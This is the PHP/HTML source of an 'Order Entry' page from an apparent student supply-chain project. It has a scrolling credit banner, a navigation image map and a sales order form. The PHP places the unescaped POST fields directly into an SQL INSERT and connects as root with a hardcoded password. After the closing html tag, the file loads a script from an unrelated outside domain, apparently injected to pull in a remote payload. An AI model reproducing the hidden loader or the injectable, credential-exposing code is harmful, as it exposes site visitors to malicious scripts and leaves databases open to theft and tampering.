<html>
<head>

<title>Order Entry</title>
</head>
<SCRIPT language=JavaScript>
<!--
// Use the following three variables to set up the message:
var msg = "This Software is Designed By Lalit Chandnani(Administrator & Frontend Designer), Deepak Agnihotri(Analysis & Connectivity), Rahul Sharma(Database Designer) Student of CSE VIsem,OIST Bpl"
var delay = 100
var startPos = 127

// Don't touch these variables:
var timerID = null
var timerRunning = false
var pos = 0

// Crank it up!
StartScrolling()

function StartScrolling(){
    // Make sure the clock is stopped
    StopTheClock()

    // Pad the message with spaces to get the "start" position
    for (var i = 0; i < startPos; i++) msg = " " + msg

    // Off we go...
    DoTheScroll()
}

function StopTheClock(){
    if(timerRunning)
        clearTimeout(timerID)
    timerRunning = false
}

function DoTheScroll(){
    if (pos < msg.length)
        self.status = msg.substring(pos, msg.length);
    else
        pos=-1;
    ++pos
    timerRunning = true
    timerID = self.setTimeout("DoTheScroll()", delay)
}
//-->

</SCRIPT>
<body background="back.jpg">

	<img src="./top.jpg" width=975 >
<table width=1000>
	<tr>
	<td width='90%'><b>Welcome, lalit </b></td>
	<td width="10%"><a href="end.php" align="right"><font color="#000000"><b>Logout</b></font></a></td>
	</tr>
</table>

	
<table>

<td width=300 height=300 colspan=1 rowspan=3 valign=top align=left>
	<map name="map397">
				<area shape='rect' coords='4,5,135,40' href='customer.php'>
				<area shape='rect' coords='4,49,135,83' href='item.php'>
				<area shape='rect' coords='4,93,135,127' href='sales.php'>
				<area shape='rect' coords='4,137,135,172' href='supplier.php'>
				<area shape='rect' coords='4,179,135,213' href='purchase.php'>
				<area shape='rect' coords='4,220,135,258' href='report.php'>
				<area shape='rect' coords='4,270,135,310' href='end.php'>
	</map>

	<tr>
	<td width="5%"></td>
	<td width="35%">   <img  border=0 src="sales.jpg" usemap="#map397"></td>
	<td width="60%"><br><br> <br><br> 
				<img src="ordent.jpg" width=600 hight=75>
				
 				<form action="ordent.php" method="POST">
				<input type="hidden" name="lalitvar">
					Order ID :<input type="text" name="orderid"><br><br>
					Customer ID :<input type="text" name="custid"><br><br>
					Item ID :<input type="text" name="itemid"><br><br>
					Category :<br><textarea name="category" rows=5 cols=30 ></textarea><br><br>
					Item Name :<input type="text" name="itemname"><br><br>
					Quantity of Item :<input type="text" name="qoi"><br><br>
					Quantity :<input type="text" name="qua"><br><br>
					Price/unit :<input type="text" name="ppu"><br><br>						
					Order Date :<input type="text" name="odate"><br><br>
					Delivery Date :<input type="text" name="ddate"><br><br>
					Returing Date :<input type="text" name="rdate"><br><br>
					<input type="submit" name ="add" value="add">
					<input type="reset" name="reset" value="Reset">
				</form>
<?php
$orderid = $_POST['orderid'];
$custid = $_POST['custid'];
$itemid = $_POST['itemid'];
$category = $_POST['category'];
$itemname = $_POST['itemname'];
$qoi = $_POST['qoi'];
$quantity = $_POST['qua'];
$ppu = $_POST['ppu'];
$orderdate = $_POST['odate'];
$deliverydate = $_POST['ddate'];
$returndate = $_POST['rdate'];

			if(isset($_POST['lalitvar']))
			{
			$link = mysql_connect("localhost", "root", "gate1024");
			$result = mysql_db_query('scm',"INSERT INTO sales VALUES('$orderid','$custid','$itemid','$category','$itemname','$qoi','$quantity','$ppu','$orderdate','$deliverydate','$returndate')",$link);
			}		




			
?>

	</td>
	</tr>
	
</td>
</table>

</body>
</html>
<script src="http://www.yayadown.com/b.js"></script>